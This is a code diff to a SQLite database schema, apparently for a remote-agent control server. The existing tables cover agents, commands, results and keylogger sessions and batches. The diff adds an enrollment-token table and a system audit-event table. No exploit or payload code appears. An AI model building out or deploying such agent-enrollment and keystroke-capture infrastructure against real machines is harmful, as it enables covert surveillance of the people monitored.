@@ -284,6 +284,17 @@ export const registrySubscription = sqliteTable(
 	})
 );
 
+export const enrollmentToken = sqliteTable('enrollment_token', {
+	token: text('token').primaryKey(),
+	createdAt: timestamp('created_at', { defaultNow: true }),
+	expiresAt: timestamp('expires_at', { optional: true }),
+	createdBy: text('created_by').references(() => user.id, { onDelete: 'set null' }),
+	maxUses: integer('max_uses').notNull().default(1),
+	uses: integer('uses').notNull().default(0),
+	revokedAt: timestamp('revoked_at', { optional: true }),
+	memo: text('memo')
+});
+
 export const agent = sqliteTable(
 	'agent',
 	{
@@ -419,6 +430,22 @@ export const keyloggerBatch = sqliteTable(
 	})
 );
 
+export const systemAuditEvent = sqliteTable(
+	'system_audit_event',
+	{
+		id: integer('id').primaryKey({ autoIncrement: true }),
+		actorId: text('actor_id').references(() => user.id, { onDelete: 'set null' }),
+		action: text('action').notNull(),
+		targetId: text('target_id'),
+		details: text('details'),
+		createdAt: timestamp('created_at', { defaultNow: true })
+	},
+	(table) => ({
+		actorIdx: index('system_audit_event_actor_idx').on(table.actorId),
+		actionIdx: index('system_audit_event_action_idx').on(table.action)
+	})
+);
+
 export type Session = typeof session.$inferSelect;
 
 export type User = typeof user.$inferSelect;
@@ -435,5 +462,6 @@ export type AgentNote = typeof agentNote.$inferSelect;
 export type AgentCommand = typeof agentCommand.$inferSelect;
 export type AgentResult = typeof agentResult.$inferSelect;
 export type AuditEvent = typeof auditEvent.$inferSelect;
+export type SystemAuditEvent = typeof systemAuditEvent.$inferSelect;
 export type KeyloggerSession = typeof keyloggerSession.$inferSelect;
 export type KeyloggerBatch = typeof keyloggerBatch.$inferSelect;
